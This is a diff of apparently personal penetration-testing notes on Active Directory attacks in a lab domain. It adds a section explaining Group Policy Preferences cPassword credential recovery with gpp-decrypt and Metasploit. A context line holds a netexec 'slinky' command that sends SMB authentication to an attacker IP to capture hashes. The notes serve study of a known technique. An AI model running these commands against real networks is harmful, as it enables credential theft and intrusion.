@@ -270,3 +270,16 @@ This can be used in the event when we are having trouble gaining further access 
     
     netexec smb <target IP> -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=<attacker IP>  
 
+---
+
+## 🚩 GPP AKA cPassword Attacks  
+1. Group Policy Preferences (GPP) an older protocol which allowed admins to create policies with embedded credentials.
+2. These credentials are encrypted and placed in a 'cPassword'.
+3. Key was released, patched in MS14-025 but does not prevent previous uses.
+4. If there is an old Domain Controller, patch was not made or the older files still exists, there is a chance these credentials are still there.  
+
+Example of gpp-decrypt (built in Kali tool):  
+![image](https://github.com/user-attachments/assets/5527c8b9-4d31-47de-84ae-1a4a3596ec4f)  
+
+Metasploit example with valid credentials, logs in with any valid credentials and looks in the 'sysvol' of the Domain Controller for XML files for group policies that may contain 'cPasswords'. If it finds any 'cPasswords' it will attempt to crack it as well.
+![image](https://github.com/user-attachments/assets/805e0f60-69d3-4135-bb2c-38d612998493)
